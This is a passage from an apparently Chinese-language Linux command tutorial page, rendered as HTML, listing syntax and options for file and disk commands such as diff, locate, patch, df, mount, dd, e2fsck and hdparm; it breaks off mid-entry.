class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ada">user : 新的文件拥有者的使用者 <span class="hljs-type">ID</span><br>group : 新的文件拥有者的使用者组(<span class="hljs-type">group</span>)<br>-c : 显示更改的部分的信息<br>-f : 忽略错误信息<br>-h :修复符号链接<br>-v : 显示详细的处理信息<br>-R : 处理指定目录以及其子目录下的所有文件<br><span class="hljs-comment">--help : 显示辅助说明</span><br><span class="hljs-comment">--version : 显示版本</span><br></code></pre></td></tr></table></figure><h4 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h4><p>Linux diff命令用于比较文件的差异。<br>diff以逐行的方式，比较文本文件的异同处。如果指定要比较目录，则diff会比较目录中相同文件名的文件，但不会比较其中子目录。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">diff <span class="hljs-selector-attr">[-abBcdefHilnNpPqrstTuvwy]</span><span class="hljs-selector-attr">[-&lt;行数&gt;]</span><span class="hljs-selector-attr">[-C &lt;行数&gt;]</span><span class="hljs-selector-attr">[-D &lt;巨集名称&gt;]</span><span class="hljs-selector-attr">[-I &lt;字符或字符串&gt;]</span><span class="hljs-selector-attr">[-S &lt;文件&gt;]</span><span class="hljs-selector-attr">[-W &lt;宽度&gt;]</span><span class="hljs-selector-attr">[-x &lt;文件或目录&gt;]</span><span class="hljs-selector-attr">[-X &lt;文件&gt;]</span><span class="hljs-selector-attr">[--help]</span><span class="hljs-selector-attr">[--left-column]</span><span class="hljs-selector-attr">[--suppress-common-line]</span><span class="hljs-selector-attr">[文件或目录1]</span><span class="hljs-selector-attr">[文件或目录2]</span><br></code></pre></td></tr></table></figure><p>后面加一个指令diffstat可以读取diff的输出结果，然后统计各文件的插入，删除，修改等差异计量。</p><h4 id="lsattr"><a href="#lsattr" class="headerlink" title="lsattr"></a>lsattr</h4><p>Linux lsattr命令用于显示文件属性。<br>用chattr执行改变文件或目录的属性，可执行lsattr指令查询其属性。</p><h4 id="whereis"><a href="#whereis" class="headerlink" title="whereis"></a>whereis</h4><p>Linux whereis命令用于查找文件。<br>该指令会在特定目录中查找符合条件的文件。这些文件应属于原始代码、二进制文件，或是帮助文件。<br>该指令只能用于查找二进制文件、源代码文件和man手册页，一般文件的定位需使用locate命令。</p><h4 id="locate"><a href="#locate" class="headerlink" title="locate"></a>locate</h4><p>Linux locate命令用于查找符合条件的文档，他会去保存文档和目录名称的数据库内，查找合乎范本样式条件的文档或目录。一般情况我们只需要输入 locate your_file_name 即可查找指定文件。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">locate <span class="hljs-selector-attr">[-d ]</span><span class="hljs-selector-attr">[--help]</span><span class="hljs-selector-attr">[--version]</span><span class="hljs-selector-attr">[范本样式...]</span><br></code></pre></td></tr></table></figure><p>参数：</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">-</span><span class="hljs-comment">b</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">basename</span> <span class="hljs-literal">--</span> <span class="hljs-comment">仅匹配路径名的基本名称</span><br><span class="hljs-literal">-</span><span class="hljs-comment">c</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">count</span> <span class="hljs-literal">--</span> <span class="hljs-comment">只输出找到的数量</span><br><span class="hljs-literal">-</span><span class="hljs-comment">d</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">database DBPATH</span> <span class="hljs-literal">--</span> <span class="hljs-comment">使用 DBPATH 指定的数据库，而不是默认数据库 /var/lib/mlocate/mlocate</span><span class="hljs-string">.</span><span class="hljs-comment">db</span><br><span class="hljs-literal">-</span><span class="hljs-comment">e</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">existing</span> <span class="hljs-literal">--</span> <span class="hljs-comment">仅打印当前现有文件的条目</span><br><span class="hljs-literal">-</span><span class="hljs-comment">1</span> <span class="hljs-literal">--</span> <span class="hljs-comment">如果 是 1．则启动安全模式。在安全模式下，使用者不会看到权限无法看到 的档案。这会始速度减慢，因为 locate 必须至实际的档案系统中取得档案的 权限资料。</span><br><span class="hljs-literal">-</span><span class="hljs-comment">0</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">null</span> <span class="hljs-literal">--</span> <span class="hljs-comment">在输出上带有NUL的单独条目</span><br><span class="hljs-literal">-</span><span class="hljs-comment">S</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">statistics</span> <span class="hljs-literal">--</span> <span class="hljs-comment">不搜索条目，打印有关每个数据库的统计信息</span><br><span class="hljs-literal">-</span><span class="hljs-comment">q</span> <span class="hljs-literal">--</span> <span class="hljs-comment">安静模式，不会显示任何错误讯息。</span><br><span class="hljs-literal">-</span><span class="hljs-comment">P</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">nofollow</span><span class="hljs-string">,</span> <span class="hljs-literal">-</span><span class="hljs-comment">H</span> <span class="hljs-literal">--</span> <span class="hljs-comment">检查文件存在时不要遵循尾随的符号链接</span><br><span class="hljs-literal">-</span><span class="hljs-comment">l</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">limit</span><span class="hljs-string">,</span> <span class="hljs-literal">-</span><span class="hljs-comment">n LIMIT</span> <span class="hljs-literal">--</span> <span class="hljs-comment">将输出（或计数）限制为LIMIT个条目</span><br><span class="hljs-literal">-</span><span class="hljs-comment">n</span> <span class="hljs-literal">--</span> <span class="hljs-comment">至多显示 n个输出。</span><br><span class="hljs-literal">-</span><span class="hljs-comment">m</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">mmap</span> <span class="hljs-literal">--</span> <span class="hljs-comment">被忽略，为了向后兼容</span><br><span class="hljs-literal">-</span><span class="hljs-comment">r</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">regexp REGEXP</span> <span class="hljs-literal">--</span> <span class="hljs-comment">使用基本正则表达式</span><br><span class="hljs-literal">--</span><span class="hljs-comment">regex</span> <span class="hljs-literal">--</span> <span class="hljs-comment">使用扩展正则表达式</span><br><span class="hljs-literal">-</span><span class="hljs-comment">q</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">quiet</span> <span class="hljs-literal">--</span> <span class="hljs-comment">安静模式，不会显示任何错误讯息</span><br><span class="hljs-literal">-</span><span class="hljs-comment">s</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">stdio</span> <span class="hljs-literal">--</span> <span class="hljs-comment">被忽略，为了向后兼容</span><br><span class="hljs-literal">-</span><span class="hljs-comment">o</span> <span class="hljs-literal">--</span> <span class="hljs-comment">指定资料库存的名称。</span><br><span class="hljs-literal">-</span><span class="hljs-comment">h</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">help</span> <span class="hljs-literal">--</span> <span class="hljs-comment">显示帮助</span><br><span class="hljs-literal">-</span><span class="hljs-comment">i</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">ignore</span><span class="hljs-literal">-</span><span class="hljs-comment">case</span> <span class="hljs-literal">--</span> <span class="hljs-comment">忽略大小写</span><br><span class="hljs-literal">-</span><span class="hljs-comment">V</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">version</span> <span class="hljs-literal">--</span> <span class="hljs-comment">显示版本信息</span> <br></code></pre></td></tr></table></figure><h4 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h4><p>Linux patch命令用于修补文件。<br>patch指令让用户利用设置修补文件的方式，修改，更新原始文件。倘若一次仅修改一个文件，可直接在指令列中下达指令依序执行。如果配合修补文件的方式则能一次修补大批文件，这也是Linux系统核心的升级方法之一。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">patch <span class="hljs-selector-attr">[-bceEflnNRstTuvZ]</span><span class="hljs-selector-attr">[-B &lt;备份字首字符串&gt;]</span><span class="hljs-selector-attr">[-d &lt;工作目录&gt;]</span><span class="hljs-selector-attr">[-D &lt;标示符号&gt;]</span><span class="hljs-selector-attr">[-F &lt;监别列数&gt;]</span><span class="hljs-selector-attr">[-g &lt;控制数值&gt;]</span><span class="hljs-selector-attr">[-i &lt;修补文件&gt;]</span><span class="hljs-selector-attr">[-o &lt;输出文件&gt;]</span><span class="hljs-selector-attr">[-p &lt;剥离层级&gt;]</span><span class="hljs-selector-attr">[-r &lt;拒绝文件&gt;]</span><span class="hljs-selector-attr">[-V &lt;备份方式&gt;]</span><span class="hljs-selector-attr">[-Y &lt;备份字首字符串&gt;]</span><span class="hljs-selector-attr">[-z &lt;备份字尾字符串&gt;]</span><span class="hljs-selector-attr">[--backup-if -mismatch]</span><span class="hljs-selector-attr">[--binary]</span><span class="hljs-selector-attr">[--help]</span><span class="hljs-selector-attr">[--nobackup-if-mismatch]</span><span class="hljs-selector-attr">[--verbose]</span><span class="hljs-selector-attr">[原始文件 &lt;修补文件&gt;]</span> 或 path <span class="hljs-selector-attr">[-p &lt;剥离层级&gt;]</span> &lt; <span class="hljs-selector-attr">[修补文件]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-b或–backup 　备份每一个原始文件。<br>-B&lt;备份字首字符串&gt;或–prefix&#x3D;&lt;备份字首字符串&gt; 　设置文件备份时，附加在文件名称前面的字首字符串，该字符串可以是路径名称。<br>-c或–context 　把修补数据解译成关联性的差异。<br>-d&lt;工作目录&gt;或–directory&#x3D;&lt;工作目录&gt; 　设置工作目录。<br>-D&lt;标示符号&gt;或–ifdef&#x3D;&lt;标示符号&gt; 　用指定的符号把改变的地方标示出来。<br>-e或–ed 　把修补数据解译成ed指令可用的叙述文件。<br>-E或–remove-empty-files 　若修补过后输出的文件其内容是一片空白，则移除该文件。<br>-f或–force 　此参数的效果和指定”-t”参数类似，但会假设修补数据的版本为新　版本。<br>-F&lt;监别列数&gt;或–fuzz&lt;监别列数&gt; 　设置监别列数的最大值。<br>-g&lt;控制数值&gt;或–get&#x3D;&lt;控制数值&gt; 　设置以RSC或SCCS控制修补作业。<br>-i&lt;修补文件&gt;或–input&#x3D;&lt;修补文件&gt; 　读取指定的修补文件。<br>-l或–ignore-whitespace 　忽略修补数据与输入数据的跳格，空格字符。<br>-n或–normal 　把修补数据解译成一般性的差异。<br>-N或–forward 　忽略修补的数据较原始文件的版本更旧，或该版本的修补数据已使　用过。<br>-o&lt;输出文件&gt;或–output&#x3D;&lt;输出文件&gt; 　设置输出文件的名称，修补过的文件会以该名称存放。<br>-p&lt;剥离层级&gt;或–strip&#x3D;&lt;剥离层级&gt; 　设置欲剥离几层路径名称。<br>-f&lt;拒绝文件&gt;或–reject-file&#x3D;&lt;拒绝文件&gt; 　设置保存拒绝修补相关信息的文件名称，预设的文件名称为.rej。<br>-R或–reverse 　假设修补数据是由新旧文件交换位置而产生。<br>-s或–quiet或–silent 　不显示指令执行过程，除非发生错误。<br>-t或–batch 　自动略过错误，不询问任何问题。<br>-T或–set-time 　此参数的效果和指定”-Z”参数类似，但以本地时间为主。<br>-u或–unified 　把修补数据解译成一致化的差异。<br>-v或–version 　显示版本信息。<br>-V&lt;备份方式&gt;或–version-control&#x3D;&lt;备份方式&gt; 　用”-b”参数备份目标文件后，备份文件的字尾会被加上一个备份字符串，这个字符串不仅可用”-z”参数变更，当使用”-V”参数指定不同备份方式时，也会产生不同字尾的备份字符串。<br>-Y&lt;备份字首字符串&gt;或–basename-prefix&#x3D;–&lt;备份字首字符串&gt; 　设置文件备份时，附加在文件基本名称开头的字首字符串。<br>-z&lt;备份字尾字符串&gt;或–suffix&#x3D;&lt;备份字尾字符串&gt; 　此参数的效果和指定”-B”参数类似，差别在于修补作业使用的路径与文件名若为src&#x2F;linux&#x2F;fs&#x2F;super.c，加上”backup&#x2F;“字符串后，文件super.c会备份于&#x2F;src&#x2F;linux&#x2F;fs&#x2F;backup目录里。<br>-Z或–set-utc 　把修补过的文件更改，存取时间设为UTC。<br>–backup-if-mismatch 　在修补数据不完全吻合，且没有刻意指定要备份文件时，才备份文件。<br>–binary 　以二进制模式读写数据，而不通过标准输出设备。<br>–help 　在线帮助。<br>–nobackup-if-mismatch 　在修补数据不完全吻合，且没有刻意指定要备份文件时，不要备份文件。<br>–verbose 　详细显示指令的执行过程。</p><h4 id="updatedb"><a href="#updatedb" class="headerlink" title="updatedb"></a>updatedb</h4><p>updatedb 命令用来创建或更新 slocate&#x2F;locate 命令所必需的数据库文件。<br>updatedb 命令的执行过程较长，因为在执行时它会遍历整个系统的目录树，并将所有的文件信息写入 slocate&#x2F;locate 数据库文件中。<br>注意：slocate 本身具有一个数据库，里面存放了系统中文件与目录的相关信息。</p><p>语法：</p><p>updatedb(选项)</p><p>参数：</p><p>-o&lt;文件&gt;：忽略默认的数据库文件，使用指定的slocate数据库文件；<br>-U&lt;目录&gt;：更新指定目录的slocate数据库；<br>-v：显示执行的详细过程。</p><h2 id="磁盘"><a href="#磁盘" class="headerlink" title="磁盘"></a>磁盘</h2><h3 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h3><h4 id="df"><a href="#df" class="headerlink" title="df"></a>df</h4><p>Linux df命令用于显示目前在Linux系统上的文件系统的磁盘使用情况统计。</p><p>语法：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">df [选项]... [<span class="hljs-symbol">FILE</span>]...<br></code></pre></td></tr></table></figure><p>参数：</p><p>文件-a, –all 包含所有的具有 0 Blocks 的文件系统<br>文件–block-size&#x3D;{SIZE} 使用 {SIZE} 大小的 Blocks<br>文件-h, –human-readable 使用人类可读的格式(预设值是不加这个选项的…)<br>文件-H, –si 很像 -h, 但是用 1000 为单位而不是用 1024<br>文件-i, –inodes 列出 inode 资讯，不列出已使用 block<br>文件-k, –kilobytes 就像是 –block-size&#x3D;1024<br>文件-l, –local 限制列出的文件结构<br>文件-m, –megabytes 就像 –block-size&#x3D;1048576<br>文件–no-sync 取得资讯前不 sync (预设值)<br>文件-P, –portability 使用 POSIX 输出格式<br>文件–sync 在取得资讯前 sync<br>文件-t, –type&#x3D;TYPE 限制列出文件系统的 TYPE<br>文件-T, –print-type 显示文件系统的形式<br>文件-x, –exclude-type&#x3D;TYPE 限制列出文件系统不要显示 TYPE</p><h4 id="du"><a href="#du" class="headerlink" title="du"></a>du</h4><p>Linux du命令用于显示目录或文件的大小。<br>du会显示指定的目录或文件所占用的磁盘空间。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">du <span class="hljs-selector-attr">[-abcDhHklmsSx]</span><span class="hljs-selector-attr">[-L &lt;符号连接&gt;]</span><span class="hljs-selector-attr">[-X &lt;文件&gt;]</span><span class="hljs-selector-attr">[--block-size]</span><span class="hljs-selector-attr">[--exclude=&lt;目录或文件&gt;]</span><span class="hljs-selector-attr">[--max-depth=&lt;目录层数&gt;]</span><span class="hljs-selector-attr">[--help]</span><span class="hljs-selector-attr">[--version]</span><span class="hljs-selector-attr">[目录或文件]</span><br></code></pre></td></tr></table></figure><h4 id="stat"><a href="#stat" class="headerlink" title="stat"></a>stat</h4><p>Linux stat命令用于显示inode内容。<br>stat以文字的格式来显示inode的内容。</p><p>语法：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">stat</span><span class="hljs-meta"> [文件或目录]</span><br></code></pre></td></tr></table></figure><h4 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h4><p>Linux pwd命令用于显示工作目录。<br>执行pwd指令可立刻得知您目前所在的工作目录的绝对路径名称。</p><h4 id="tree"><a href="#tree" class="headerlink" title="tree"></a>tree</h4><p>Linux tree命令用于以树状图列出目录的内容。<br>执行tree指令，它会列出指定目录下的所有文件，包括子目录里的文件。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">tree <span class="hljs-selector-attr">[-aACdDfFgilnNpqstux]</span><span class="hljs-selector-attr">[-I &lt;范本样式&gt;]</span><span class="hljs-selector-attr">[-P &lt;范本样式&gt;]</span><span class="hljs-selector-attr">[目录...]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-a 显示所有文件和目录。<br>-A 使用ASNI绘图字符显示树状图而非以ASCII字符组合。<br>-C 在文件和目录清单加上色彩，便于区分各种类型。<br>-d 显示目录名称而非内容。<br>-D 列出文件或目录的更改时间。<br>-f 在每个文件或目录之前，显示完整的相对路径名称。<br>-F 在执行文件，目录，Socket，符号连接，管道名称名称，各自加上”*”,”&#x2F;“,”&#x3D;”,”@”,”|”号。<br>-g 列出文件或目录的所属群组名称，没有对应的名称时，则显示群组识别码。<br>-i 不以阶梯状列出文件或目录名称。<br>-L level 限制目录显示层级。<br>-l 如遇到性质为符号连接的目录，直接列出该连接所指向的原始目录。<br>-n 不在文件和目录清单加上色彩。<br>-N 直接列出文件和目录名称，包括控制字符。<br>-p 列出权限标示。<br>-P&lt;范本样式&gt; 只显示符合范本样式的文件或目录名称。<br>-q 用”?”号取代控制字符，列出文件和目录名称。<br>-s 列出文件或目录大小。<br>-t 用文件和目录的更改时间排序。<br>-u 列出文件或目录的拥有者名称，没有对应的名称时，则显示用户识别码。<br>-x 将范围局限在现行的文件系统中，若指定目录下的某些子目录，其存放于另一个文件系统上，则将该子目录予以排除在寻找范围外。</p><h3 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h3><p>Linux mount命令是经常会使用到的命令，它用于挂载Linux系统外的文件。</p><p>语法：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs inform7">mount <span class="hljs-comment">[-hV]</span><br>mount -a <span class="hljs-comment">[-fFnrsvw]</span> <span class="hljs-comment">[-t vfstype]</span><br>mount <span class="hljs-comment">[-fnrsvw]</span> <span class="hljs-comment">[-o options <span class="hljs-comment">[,...]</span>]</span> device | dir<br>mount <span class="hljs-comment">[-fnrsvw]</span> <span class="hljs-comment">[-t vfstype]</span> <span class="hljs-comment">[-o options]</span> device dir<br></code></pre></td></tr></table></figure><p>参数：</p><p>-V：显示程序版本<br>-h：显示辅助讯息<br>-v：显示较讯息，通常和 -f 用来除错。<br>-a：将 &#x2F;etc&#x2F;fstab 中定义的所有档案系统挂上。<br>-F：这个命令通常和 -a 一起使用，它会为每一个 mount 的动作产生一个行程负责执行。在系统需要挂上大量 NFS 档案系统时可以加快挂上的动作。<br>-f：通常用在除错的用途。它会使 mount 并不执行实际挂上的动作，而是模拟整个挂上的过程。通常会和 -v 一起使用。<br>-n：一般而言，mount 在挂上后会在 &#x2F;etc&#x2F;mtab 中写入一笔资料。但在系统中没有可写入档案系统存在的情况下可以用这个选项取消这个动作。<br>-s-r：等于 -o ro<br>-w：等于 -o rw<br>-L：将含有特定标签的硬盘分割挂上。<br>-U：将档案分割序号为 的档案系统挂下。-L 和 -U 必须在&#x2F;proc&#x2F;partition 这种档案存在时才有意义。<br>-t：指定档案系统的型态，通常不必指定。mount 会自动选择正确的型态。<br>-o async：打开非同步模式，所有的档案读写动作都会用非同步模式执行。<br>-o sync：在同步模式下执行。<br>-o atime、-o noatime：当 atime 打开时，系统会在每次读取档案时更新档案的『上一次调用时间』。当我们使用 flash 档案系统时可能会选项把这个选项关闭以减少写入的次数。<br>-o auto、-o noauto：打开&#x2F;关闭自动挂上模式。<br>-o defaults:使用预设的选项 rw, suid, dev, exec, auto, nouser, and async.<br>-o dev、-o nodev-o exec、-o noexec允许执行档被执行。<br>-o suid、-o nosuid：<br>允许执行档在 root 权限下执行。<br>-o user、-o nouser：使用者可以执行 mount&#x2F;umount 的动作。<br>-o remount：将一个已经挂下的档案系统重新用不同的方式挂上。例如原先是唯读的系统，现在用可读写的模式重新挂上。<br>-o ro：用唯读模式挂上。<br>-o rw：用可读写模式挂上。<br>-o loop&#x3D;：使用 loop 模式用来将一个档案当成硬盘分割挂上系统。</p><h4 id="umount"><a href="#umount" class="headerlink" title="umount"></a>umount</h4><p>Linux umount命令用于卸除文件系统。<br>umount可卸除目前挂在Linux目录中的文件系统。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">umount <span class="hljs-selector-attr">[-ahnrvV]</span><span class="hljs-selector-attr">[-t &lt;文件系统类型&gt;]</span><span class="hljs-selector-attr">[文件系统]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-a 卸除&#x2F;etc&#x2F;mtab中记录的所有文件系统。<br>-h 显示帮助。<br>-n 卸除时不要将信息存入&#x2F;etc&#x2F;mtab文件中。<br>-r 若无法成功卸除，则尝试以只读的方式重新挂入文件系统。<br>-t&lt;文件系统类型&gt; 仅卸除选项中所指定的文件系统。<br>-v 执行时显示详细的信息。<br>-V 显示版本信息。<br>[文件系统] 除了直接指定文件系统外，也可以用设备名称或挂入点来表示文件系统。</p><h4 id="quota"><a href="#quota" class="headerlink" title="quota"></a>quota</h4><p>用于管理用户的磁盘配额。</p><h3 id="磁盘维护"><a href="#磁盘维护" class="headerlink" title="磁盘维护"></a>磁盘维护</h3><h4 id="badblocks"><a href="#badblocks" class="headerlink" title="badblocks"></a>badblocks</h4><p>Linux badblocks命令用于检查磁盘装置中损坏的区块。<br>执行指令时须指定所要检查的磁盘装置，及此装置的磁盘区块数。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">badblocks <span class="hljs-selector-attr">[-svw]</span><span class="hljs-selector-attr">[-b &lt;区块大小&gt;]</span><span class="hljs-selector-attr">[-o &lt;输出文件&gt;]</span><span class="hljs-selector-attr">[磁盘装置]</span><span class="hljs-selector-attr">[磁盘区块数]</span><span class="hljs-selector-attr">[启始区块]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-b&lt;区块大小&gt; 指定磁盘的区块大小，单位为字节。<br>-o&lt;输出文件&gt; 将检查的结果写入指定的输出文件。<br>-s 在检查时显示进度。<br>-v 执行时显示详细的信息。<br>-w 在检查时，执行写入测试。<br>[磁盘装置] 指定要检查的磁盘装置。<br>[磁盘区块数] 指定磁盘装置的区块总数。<br>[启始区块] 指定要从哪个区块开始检查。</p><h4 id="cfdisk"><a href="#cfdisk" class="headerlink" title="cfdisk"></a>cfdisk</h4><p>Linux cfdisk命令用于磁盘分区。<br>cfdisk是用来磁盘分区的程序，它十分类似DOS的fdisk，具有互动式操作界面而非传统fdisk的问答式界面，您可以轻易地利用方向键来操控分区操作。</p><p>语法：</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">cfdisk [-avz][-c <span class="hljs-attribute">&lt;柱面数目&gt;</span>-h <span class="hljs-attribute">&lt;磁头数目&gt;</span>-s <span class="hljs-attribute">&lt;盘区数目&gt;</span>][-P <span class="hljs-attribute">&lt;r,s,t&gt;</span>][外围设备代号]<br></code></pre></td></tr></table></figure><p>参数说明：</p><p>-a 在程序里不用反白代表选取，而以箭头表示。<br>-c&lt;柱面数目&gt; 忽略BIOS的数值，直接指定磁盘的柱面数目。<br>-h&lt;磁头数目&gt; 忽略BIOS的数值，直接指定磁盘的磁头数目。<br>-P&lt;r,s,t&gt; 显示分区表的内容，附加参数”r”会显示整个分区表的详细资料，附加参数”s”会依照磁区的顺序显示相关信息，附加参数”t”则会以磁头，磁区，柱面的方式来显示资料。<br>-s&lt;磁区数目&gt; 忽略BIOS的数值，直接指定磁盘的磁区数目。<br>-v 显示版本信息。<br>-z 不读取现有的分区，直接当作没有分区的新磁盘使用。</p><h4 id="dd"><a href="#dd" class="headerlink" title="dd"></a>dd</h4><p>Linux dd命令用于读取、转换并输出数据。<br>dd可从标准输入或文件中读取数据，根据指定的格式来转换数据，再输出到文件、设备或标准输出。</p><p>参数说明：</p><p>if&#x3D;文件名：输入文件名，默认为标准输入。即指定源文件。<br>of&#x3D;文件名：输出文件名，默认为标准输出。即指定目的文件。<br>ibs&#x3D;bytes：一次读入bytes个字节，即指定一个块大小为bytes个字节。<br>obs&#x3D;bytes：一次输出bytes个字节，即指定一个块大小为bytes个字节。<br>bs&#x3D;bytes：同时设置读入&#x2F;输出的块大小为bytes个字节。<br>cbs&#x3D;bytes：一次转换bytes个字节，即指定转换缓冲区大小。<br>skip&#x3D;blocks：从输入文件开头跳过blocks个块后再开始复制。<br>seek&#x3D;blocks：从输出文件开头跳过blocks个块后再开始复制。<br>count&#x3D;blocks：仅拷贝blocks个块，块大小等于ibs指定的字节数。<br>conv&#x3D;&lt;关键字&gt;，关键字可以有以下11种： </p><ul><li>conversion：用指定的参数转换文件。<br>ascii：转换ebcdic为ascii<br>ebcdic：转换ascii为ebcdic<br>ibm：转换ascii为alternate ebcdic<br>block：把每一行转换为长度为cbs，不足部分用空格填充<br>unblock：使每一行的长度都为cbs，不足部分用空格填充<br>lcase：把大写字符转换为小写字符<br>ucase：把小写字符转换为大写字符<br>swab：交换输入的每对字节<br>noerror：出错时不停止<br>notrunc：不截短输出文件<br>sync：将每个输入块填充到ibs个字节，不足部分用空（NUL）字符补齐。</li></ul><h4 id="e2fsck"><a href="#e2fsck" class="headerlink" title="e2fsck"></a>e2fsck</h4><p>Linux e2fsck命令用于检查使用 Linux ext2 档案系统的 partition 是否正常工作。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">e2fsck <span class="hljs-selector-attr">[-pacnydfvFV]</span> <span class="hljs-selector-attr">[-b superblock]</span> <span class="hljs-selector-attr">[-B blocksize]</span> <span class="hljs-selector-attr">[-l|-L bad_blocks_file]</span> <span class="hljs-selector-attr">[-C fd]</span> device<br></code></pre></td></tr></table></figure><p>参数：</p><p>device ： 预备检查的硬盘 partition，例如：&#x2F;dev&#x2F;sda1<br>-a : 对 partition 做检查，若有问题便自动修复，等同 -p 的功能<br>-b : 设定存放 superblock 的位置<br>-B : 设定单位 block 的大小<br>-c : 检查该partition 是否有坏轨<br>-C file : 将检查的结果存到 file 中以便查看<br>-d : 列印 e2fsck 的 debug 结果<br>-f : 强制检查<br>-F : 在开始检查前，将device 的 buffer cache 清空，避免有错误发生<br>-l bad_blocks_file : 将有坏轨的block资料加到 bad_blocks_file 里面<br>-L bad_blocks_file : 设定坏轨的block资料存到 bad_blocks_file 里面，若无该档则自动产生<br>-n : 将档案系统以[唯读]方式开启<br>-p : 对 partition 做检查，若有问题便自动修复<br>-v : 详细显示模式<br>-V : 显示出目前 e2fsck 的版本<br>-y : 预先设定所有检查时的问题均回答[是]</p><h4 id="hdparm"><a href="#hdparm" class="headerlink" title="hdparm"></a>hdparm</h4><p>Linux hdparm命令用于显示与设定硬盘的参数。<br>hdparm可检测，显示与设定IDE或SCSI硬盘的参数。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">hdparm <span class="hljs-selector-attr">[-CfghiIqtTvyYZ]</span><span class="hljs-selector-attr">[-a &lt;快取分区&gt;]</span><span class="hljs-selector-attr">[-A &lt;0或1&gt;]</span><span class="hljs-selector-attr">[-c &lt;I/O模式&gt;]</span><span class="hljs-selector-attr">[-d &lt;0或1&gt;]</span><span class="hljs-selector-attr">[-k &lt;0或1&gt;]</span><span class="hljs-selector-attr">[-K &lt;0或1&gt;]</span><span class="hljs-selector-attr">[-m &lt;分区数&gt;]</span><span class="hljs-selector-attr">[-n &lt;0或1&gt;]</span><span class="hljs-selector-attr">[-p &lt;PIO模式&gt;]</span><span class="hljs-selector-attr">[-P &lt;分区数&gt;]</span><span class="hljs-selector-attr">[-r &lt;0或1&gt;]</span><span class="hljs-selector-attr">[-S &lt;时间&gt;]</span><span class="hljs-selector-attr">[-u &lt;0或1&gt;]</span><span class="hljs-selector-attr">[-W &lt;0或1&gt;]</span><span class="hljs-selector-attr">[-X &lt;传输模式&gt;]</span><span class="hljs-selector-attr">[设备]</span><br></code></pre></td></tr></table></figure><p>参数说明：</p><p>-a&lt;快取分区&gt; 设定读取文件时，预先存入块区的分区数，若不加上&lt;快取分区&gt;选项，则显示目前的设定。<br>-A&lt;0或1&gt; 启动或关闭读取文件时的快取功能。<br>-c&lt;I&#x2F;O模式&gt; 设定IDE32位I&#x2F;O模式。<br>-C 检测IDE硬盘的电源管理模式。<br>-d&lt;0或1&gt; 设定磁盘的DMA模式。<br>-f 将内存缓冲区的数据写入硬盘，并清楚缓冲区。<br>-g 